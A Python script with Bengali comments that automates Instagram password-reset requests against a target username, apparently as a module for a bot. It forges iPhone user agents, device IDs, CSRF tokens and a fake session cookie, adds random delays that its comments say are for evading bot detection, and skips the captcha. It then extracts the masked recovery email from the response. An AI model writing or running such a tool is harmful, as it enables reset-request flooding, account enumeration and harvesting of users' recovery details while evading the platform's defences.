import httpx
import re
import random
import uuid
import time

# রিয়েল iOS ডিভাইস ও ভার্সন
IOS_VERSIONS = ["16.1", "16.6", "17.0", "17.2", "17.4", "17.5"]
DEVICES = [
    ("iPhone14,2", "iPhone 13 Pro"), ("iPhone15,2", "iPhone 14 Pro"),
    ("iPhone16,1", "iPhone 15 Pro"), ("iPhone16,2", "iPhone 15 Pro Max")
]
LOCALES = ["en-US,en;q=0.9", "tr-TR,tr;q=0.9", "en-GB,en;q=0.9"]

def get_headers():
    ios = random.choice(IOS_VERSIONS)
    dev_id, dev_name = random.choice(DEVICES)
    locale = random.choice(LOCALES)
    
    # র‍্যান্ডম CSRF এবং সেশন কুকি তৈরি
    csrf = str(uuid.uuid4())
    session_id = f"{random.randint(10,99)}%3A{random.randint(1000000000, 9999999999)}%3A{random.randint(10,99)}%3A{csrf[:10]}"
    
    ua = f"Instagram 312.0.0.34.114 (iPhone; iOS {ios}; {locale}; {dev_name}; {dev_id})"
    
    return {
        "User-Agent": ua,
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "1",
        "x-requested-with": "XMLHttpRequest",
        "x-csrftoken": csrf,
        "x-device-id": ''.join(random.choices('0123456789abcdef', k=16)),
        "accept-language": locale,
        "content-type": "application/x-www-form-urlencoded",
        # কুকি স্পুফিং (ফেক সেশন)
        "Cookie": f"csrftoken={csrf}; ig_did={str(uuid.uuid4()).upper()}; ig_nrcb=1; sessionid={session_id};"
    }

URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"

def send_reset(target):
    # বট ডিটেকশন এড়াতে ২-৫ সেকেন্ড দেরি
    time.sleep(random.uniform(2.0, 5.0))
    
    payload = {
        "email_or_username": target, 
        "flow": "fxcal",
        "recaptcha_challenge_field": "",
        "recaptcha_response_field": "manual_challenge"
    }

    try:
        with httpx.Client(http2=True, headers=get_headers(), timeout=30.0) as client:
            o = client.post(URL, data=payload)
            c = o.text.lower()
            
            # রেসপন্স চেক
            if o.status_code == 429 or "rate limit" in c:
                return "error:rate_limited"
            
            ev = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', c)
            if ev: 
                return f"email:{ev.group(0)}"
                
            if "fail" in c or "no user found" in c:
                return "error:not_found"
                
            return "phone"
            
    except httpx.TimeoutException:
        return "error:timeout"
    except Exception as e:
        return f"error:{type(e).__name__}"

# bot.py এর সাথে মিল রাখার জন্য
def gen_headers():
    return get_headers()
